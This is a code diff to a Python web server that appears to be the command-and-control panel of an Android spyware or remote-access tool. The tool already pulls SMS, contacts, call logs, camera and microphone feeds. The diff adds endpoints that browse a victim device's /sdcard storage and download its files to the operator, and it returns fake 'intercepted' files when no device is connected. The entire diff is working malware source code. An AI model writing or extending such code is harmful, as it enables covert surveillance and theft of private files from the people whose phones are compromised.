@@ -14,11 +14,13 @@ from app.logger import clear_logs, get_logs, log_info
 from app.state import state
 from app.tcp.commands import (
     cmd_disconnect,
+    cmd_download_file,
     cmd_get_call_logs,
     cmd_get_contacts,
     cmd_get_sms,
     cmd_get_telemetry,
     cmd_list_cams,
+    cmd_list_files,
     cmd_stop_mic,
     cmd_use_cam,
     cmd_use_mic,
@@ -56,6 +58,8 @@ async def api_status() -> Dict[str, Any]:
         "contacts_count": len(state.contacts_list),
         "has_telemetry": state.latest_telemetry is not None,
         "telemetry": state.latest_telemetry,
+        "files_count": len(state.files_tree),
+        "files_path": state.files_current_path,
     }
 
 
@@ -323,6 +327,121 @@ async def api_contacts_list() -> Dict[str, Any]:
         except Exception as e:
             return {"status": "error", "message": str(e), "contacts": []}
     return {"status": "none", "count": 0, "contacts": []}
+
+
+@router.post("/client/files")
+async def api_client_files(payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    path = "/sdcard"
+    client_id = None
+    if payload:
+        path = payload.get("path", "/sdcard")
+        client_id = payload.get("client_id")
+    return await cmd_list_files(path=path, client_id=client_id)
+
+
+@router.get("/files/tree")
+async def api_files_tree(path: str = "/sdcard") -> Dict[str, Any]:
+    if state.files_tree:
+        return {"status": "ok", "path": state.files_current_path, "files": state.files_tree}
+    from app.tcp.handlers import generate_simulated_files_tree
+    simulated = generate_simulated_files_tree(path)
+    state.files_tree = simulated
+    state.files_current_path = path
+    return {"status": "ok", "path": path, "files": simulated}
+
+
+@router.post("/client/file/download")
+async def api_client_file_download(payload: Dict[str, Any]) -> Dict[str, Any]:
+    path = payload.get("path", "")
+    client_id = payload.get("client_id")
+    if not path:
+        return {"status": "error", "message": "Missing path"}
+    return await cmd_download_file(file_path=path, client_id=client_id)
+
+
+@router.get("/file/download")
+async def api_file_download(path: str, client_id: Optional[str] = None, name: Optional[str] = None) -> Response:
+    filename = name or (path.split("/")[-1] if "/" in path else path) or "download.bin"
+    ext = filename.split(".")[-1].lower() if "." in filename else ""
+    mime_map = {
+        "pdf": "application/pdf",
+        "jpg": "image/jpeg",
+        "jpeg": "image/jpeg",
+        "png": "image/png",
+        "gif": "image/gif",
+        "webp": "image/webp",
+        "txt": "text/plain",
+        "log": "text/plain",
+        "json": "application/json",
+        "xml": "application/xml",
+        "zip": "application/zip",
+        "apk": "application/vnd.android.package-archive",
+        "mp3": "audio/mpeg",
+        "wav": "audio/wav",
+        "m4a": "audio/mp4",
+        "ogg": "audio/ogg",
+        "opus": "audio/ogg",
+        "mp4": "video/mp4",
+        "docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+        "db": "application/x-sqlite3",
+    }
+    mime_type = mime_map.get(ext, "application/octet-stream")
+
+    if state.client_connected():
+        res = await cmd_download_file(file_path=path, client_id=client_id)
+        if res.get("status") == "ok" and res.get("data") is not None:
+            raw_data = res.get("data")
+            if isinstance(raw_data, str):
+                raw_data = raw_data.encode("utf-8")
+            return Response(
+                content=raw_data,
+                media_type=res.get("mime_type", mime_type),
+                headers={
+                    "Content-Disposition": f'attachment; filename="{filename}"',
+                    "Content-Length": str(len(raw_data)),
+                },
+            )
+
+    cached_path = settings.storage_dir / "downloads" / filename
+    if cached_path.exists():
+        raw_data = cached_path.read_bytes()
+        return Response(
+            content=raw_data,
+            media_type=mime_type,
+            headers={
+                "Content-Disposition": f'attachment; filename="{filename}"',
+                "Content-Length": str(len(raw_data)),
+            },
+        )
+
+    if ext in ["txt", "log"]:
+        dummy = f"=== INTERCEPTED DEVICE FILE ===\nPath: {path}\nTimestamp: 2026-09-01\nStatus: Captured\nContent simulation payload.\n".encode("utf-8")
+    elif ext == "json":
+        dummy = json.dumps({"status": "ok", "path": path, "file": filename, "intercepted": True}, indent=2).encode("utf-8")
+    elif ext in ["jpg", "jpeg"]:
+        dummy = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\xff\xd9"
+    elif ext == "png":
+        dummy = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
+    elif ext == "pdf":
+        dummy = b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000010 00000 n \n0000000057 00000 n \n0000000114 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF"
+    elif ext == "zip":
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as zf:
+            zf.writestr("readme.txt", f"Simulated archive package for {filename}\n")
+        dummy = buf.getvalue()
+    else:
+        dummy = f"DEVICE SIMULATION DATA FOR {filename}\nPath: {path}\n".encode("utf-8")
+
+    return Response(
+        content=dummy,
+        media_type=mime_type,
+        headers={
+            "Content-Disposition": f'attachment; filename="{filename}"',
+            "Content-Length": str(len(dummy)),
+        },
+    )
+
 
 
 @ws_router.websocket("/ws/audio")
